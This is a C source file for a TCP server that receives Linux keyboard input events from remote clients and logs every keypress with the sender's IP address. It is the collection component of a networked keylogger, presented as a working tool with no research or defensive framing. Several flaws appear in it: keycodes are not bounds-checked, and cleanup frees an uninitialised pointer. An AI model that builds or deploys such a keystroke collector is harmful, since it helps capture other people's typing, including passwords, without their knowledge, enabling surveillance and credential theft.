/* Developed by Fabio Cinicolo */

#include <stdio.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <sys/poll.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <netinet/in.h>
#include <errno.h>
#include <linux/input.h>
#include <unistd.h>
#include <string.h>
#include <arpa/inet.h>

#define SERVER_PORT 12345

#define MAX_KEYBOARD_EVENTS 10

#define TRUE 1
#define FALSE 0

char *keycodes[249] = {"KEY_RESERVED", "KEY_ESC", "KEY_1", "KEY_2", "KEY_3", "KEY_4", "KEY_5", "KEY_6", "KEY_7", "KEY_8", "KEY_9", "KEY_0", "KEY_MINUS", "KEY_EQUAL", "KEY_BACKSPACE", "KEY_TAB", "KEY_Q", "KEY_W", "KEY_E", "KEY_R", "KEY_T", "KEY_Y", "KEY_U", "KEY_I", "KEY_O", "KEY_P", "KEY_LEFTBRACE", "KEY_RIGHTBRACE", "KEY_ENTER", "KEY_LEFTCTRL", "KEY_A", "KEY_S", "KEY_D", "KEY_F", "KEY_G", "KEY_H", "KEY_J", "KEY_K", "KEY_L", "KEY_SEMICOLON", "KEY_APOSTROPHE", "KEY_GRAVE", "KEY_LEFTSHIFT", "KEY_BACKSLASH", "KEY_Z", "KEY_X", "KEY_C", "KEY_V", "KEY_B", "KEY_N", "KEY_M", "KEY_COMMA", "KEY_DOT", "KEY_SLASH", "KEY_RIGHTSHIFT", "KEY_KPASTERISK", "KEY_LEFTALT", "KEY_SPACE", "KEY_CAPSLOCK", "KEY_F1", "KEY_F2", "KEY_F3", "KEY_F4", "KEY_F5", "KEY_F6", "KEY_F7", "KEY_F8", "KEY_F9", "KEY_F10", "KEY_NUMLOCK", "KEY_SCROLLLOCK", "KEY_KP7", "KEY_KP8", "KEY_KP9", "KEY_KPMINUS", "KEY_KP4", "KEY_KP5", "KEY_KP6", "KEY_KPPLUS", "KEY_KP1", "KEY_KP2", "KEY_KP3", "KEY_KP0", "KEY_KPDOT", "KEY_ZENKAKUHANKAKU", "KEY_102ND", "KEY_F11", "KEY_F12", "KEY_RO", "KEY_KATAKANA", "KEY_HIRAGANA", "KEY_HENKAN", "KEY_KATAKANAHIRAGANA", "KEY_MUHENKAN", "KEY_KPJPCOMMA", "KEY_KPENTER", "KEY_RIGHTCTRL", "KEY_KPSLASH", "KEY_SYSRQ", "KEY_RIGHTALT", "KEY_LINEFEED", "KEY_HOME", "KEY_UP", "KEY_PAGEUP", "KEY_LEFT", "KEY_RIGHT", "KEY_END", "KEY_DOWN", "KEY_PAGEDOWN", "KEY_INSERT", "KEY_DELETE", "KEY_MACRO", "KEY_MUTE", "KEY_VOLUMEDOWN", "KEY_VOLUMEUP", "KEY_POWER", "KEY_KPEQUAL", "KEY_KPPLUSMINUS", "KEY_PAUSE", "KEY_SCALE", "KEY_KPCOMMA", "KEY_HANGEUL", "KEY_HANGUEL", "KEY_HANJA", "KEY_YEN", "KEY_LEFTMETA", "KEY_RIGHTMETA", "KEY_COMPOSE", "KEY_STOP", "KEY_AGAIN", "KEY_PROPS", "KEY_UNDO", "KEY_FRONT", "KEY_COPY", "KEY_OPEN", "KEY_PASTE", "KEY_FIND", "KEY_CUT", "KEY_HELP", "KEY_MENU", "KEY_CALC", "KEY_SETUP", "KEY_SLEEP", "KEY_WAKEUP", "KEY_FILE", "KEY_SENDFILE", "KEY_DELETEFILE", "KEY_XFER", "KEY_PROG1", "KEY_PROG2", "KEY_WWW", "KEY_MSDOS", "KEY_COFFEE", "KEY_SCREENLOCK", "KEY_ROTATE_DISPLAY", "KEY_DIRECTION", "KEY_CYCLEWINDOWS", "KEY_MAIL", "KEY_BOOKMARKS", "KEY_COMPUTER", "KEY_BACK", "KEY_FORWARD", "KEY_CLOSECD", "KEY_EJECTCD", "KEY_EJECTCLOSECD", "KEY_NEXTSONG", "KEY_PLAYPAUSE", "KEY_PREVIOUSSONG", "KEY_STOPCD", "KEY_RECORD", "KEY_REWIND", "KEY_PHONE", "KEY_ISO", "KEY_CONFIG", "KEY_HOMEPAGE", "KEY_REFRESH", "KEY_EXIT", "KEY_MOVE", "KEY_EDIT", "KEY_SCROLLUP", "KEY_SCROLLDOWN", "KEY_KPLEFTPAREN", "KEY_KPRIGHTPAREN", "KEY_NEW", "KEY_REDO", "KEY_F13", "KEY_F14", "KEY_F15", "KEY_F16", "KEY_F17", "KEY_F18", "KEY_F19", "KEY_F20", "KEY_F21", "KEY_F22", "KEY_F23", "KEY_F24", "KEY_PLAYCD", "KEY_PAUSECD", "KEY_PROG3", "KEY_PROG4", "KEY_ALL_APPLICATIONS", "KEY_DASHBOARD", "KEY_SUSPEND", "KEY_CLOSE", "KEY_PLAY", "KEY_FASTFORWARD", "KEY_BASSBOOST", "KEY_PRINT", "KEY_HP", "KEY_CAMERA", "KEY_SOUND", "KEY_QUESTION", "KEY_EMAIL", "KEY_CHAT", "KEY_SEARCH", "KEY_CONNECT", "KEY_FINANCE", "KEY_SPORT", "KEY_SHOP", "KEY_ALTERASE", "KEY_CANCEL", "KEY_BRIGHTNESSDOWN", "KEY_BRIGHTNESSUP", "KEY_MEDIA", "KEY_SWITCHVIDEOMODE", "KEY_KBDILLUMTOGGLE", "KEY_KBDILLUMDOWN", "KEY_KBDILLUMUP", "KEY_SEND", "KEY_REPLY", "KEY_FORWARDMAIL", "KEY_SAVE", "KEY_DOCUMENTS", "KEY_BATTERY", "KEY_BLUETOOTH", "KEY_WLAN", "KEY_UWB", "KEY_UNKNOWN", "KEY_VIDEO_NEXT", "KEY_VIDEO_PREV", "KEY_BRIGHTNESS_CYCLE", "KEY_BRIGHTNESS_AUTO", "KEY_BRIGHTNESS_ZERO", "KEY_DISPLAY_OFF", "KEY_WWAN", "KEY_WIMAX", "KEY_RFKILL", "KEY_MICMUTE"};

int main(int argc, char **argv)
{
  int on = 1;
  int listen_sd = -1, new_sd = -1;
  int end_server = FALSE, compress_array = FALSE;
  int close_conn;
  struct sockaddr_in server_addr, client_addr;
  int timeout;
  struct pollfd fds[200];
  int nfds = 1;
  struct input_event kbd_events[MAX_KEYBOARD_EVENTS];
  size_t event_size = sizeof(struct input_event);
  int descriptors_ready;
  char *client_addresses[200];

  /*Create listening tcp socket*/
  if ((listen_sd = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0)
    perror("socket()"), exit(EXIT_FAILURE);

  /*************************************************************/
  /* Set socket to be nonblocking. All of the sockets for      */
  /* the incoming connections will also be nonblocking since   */
  /* they will inherit that state from the listening socket.   */
  /*************************************************************/
  if (ioctl(listen_sd, FIONBIO, (char *)&on) < 0)
  {
    perror("ioctl()");
    close(listen_sd);
    exit(EXIT_FAILURE);
  }

  server_addr.sin_family = PF_INET;
  server_addr.sin_port = htons(SERVER_PORT);
  server_addr.sin_addr.s_addr = htonl(INADDR_ANY);
  memset(server_addr.sin_zero, 0, 8);

  /* Bind socket */
  if (bind(listen_sd, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0)
  {
    perror("bind()");
    close(listen_sd);
    exit(EXIT_FAILURE);
  }

  /* listen_sd is a passive socket, it will listen for incoming connections */
  if (listen(listen_sd, 32) < 0)
  {
    perror("listen() failed");
    close(listen_sd);
    exit(EXIT_FAILURE);
  }

  /* Initialize the pollfd structure */
  memset(fds, 0, sizeof(fds));

  /* Set up the initial listening socket */
  fds[0].fd = listen_sd;
  fds[0].events = POLLIN;

  /* Set up infinite poll timeout */
  timeout = -1;

  printf("Server is running\n\n");
  /* Accept new connections or read from ready sockets */
  do
  {
    if ((descriptors_ready = poll(fds, nfds, timeout)) < 0)
    {
      perror("poll()");
      break;
    }

    /*One or more descriptors are ready, we have to find and operate on them*/
    for (int i = 0; i < nfds && descriptors_ready > 0; i++)
    {
      /*If current file descriptor is not ready we skip it*/
      if (fds[i].revents == 0)
        continue;

      /* If revents is not POLLIN, it's an unexpected result, log and end the server. */
      if (fds[i].revents != POLLIN)
      {
        fprintf(stderr, "Error! revents = %d\n", fds[i].revents);
        end_server = TRUE;
        break;
      }
      if (fds[i].fd == listen_sd)
      {
        descriptors_ready--;

        /* Listening socket is readable, we accept every incoming connection until
           accept() fails with EWOULDBLOCK */
        do
        {
          socklen_t client_addr_length = sizeof(client_addr);
          if ((new_sd = accept(listen_sd, (struct sockaddr *)&client_addr, &client_addr_length)) < 0)
          {
            if (errno != EWOULDBLOCK)
            {
              perror("accept()");
              end_server = TRUE;
            }
            break;
          }

          /* Add the new incoming connection to the pollfd struct */
          char *client_ip = inet_ntoa(client_addr.sin_addr);
          printf("New incoming connection ip: %s - fd: %d\n", client_ip, fds[i].fd);
          fds[nfds].fd = new_sd;
          fds[nfds].events = POLLIN;
          client_addresses[nfds] = malloc(strlen(client_ip) + 1);
          strncpy(client_addresses[nfds], client_ip, strlen(client_ip) + 1);
          nfds++;

        } while (new_sd != -1);
      }

      /*Accepted socket is readable*/

      else
      {
        descriptors_ready--;
        close_conn = FALSE;
        do
        {
          ssize_t bytes_read;
          if ((bytes_read = recv(fds[i].fd, kbd_events, MAX_KEYBOARD_EVENTS * event_size, 0)) < 0)
          {
            if (errno != EWOULDBLOCK)
            {
              perror("recv()");
              close_conn = TRUE;
            }
            break;
          }

          /* Reading keyboard press events */
          for (ssize_t j = 0; j < bytes_read / event_size; j++)
            printf("Ip: %s - Time:%ld - Key:%s\n", client_addresses[i], kbd_events[j].time.tv_sec, keycodes[kbd_events[j].code]);

          /*If client closed connection*/
          if (!bytes_read)
          {

            close_conn = TRUE;
            break;
          }

        } while (TRUE);

        /* If the close_conn flag was turned on, we need       */
        /* to clean up this active connection. This            */
        /* clean up process includes removing the              */
        /* descriptor.                                         */
        if (close_conn)
        {
          printf("Client closed connection ip: %s fd: %d\n", client_addresses[i], fds[i].fd);
          close(fds[i].fd);
          free(client_addresses[i]);
          fds[i].fd = -1;
          compress_array = TRUE;
        }
      }
    }

    /* If the compress_array flag was turned on, we need       */
    /* to squeeze together the array and decrement the number  */
    /* of file descriptors. We do not need to move back the    */
    /* events and revents fields because the events will always*/
    /* be POLLIN in this case, and revents is output.          */
    if (compress_array)
    {
      compress_array = FALSE;
      for (int i = 0; i < nfds; i++)
      {
        if (fds[i].fd == -1)
        {
          for (int j = i; j < nfds - 1; j++)
          {
            fds[j].fd = fds[j + 1].fd;
            client_addresses[j] = client_addresses[j + 1];
          }
          i--;
          nfds--;
        }
      }
    }

  } while (end_server == FALSE);

  /* Clean up all of the sockets that are open */
  for (int i = 0; i < nfds; i++)
  {
    if (client_addresses[i] != NULL)
      free(client_addresses[i]);

    if (fds[i].fd >= 0)
      close(fds[i].fd);
  }

  exit(EXIT_SUCCESS);
}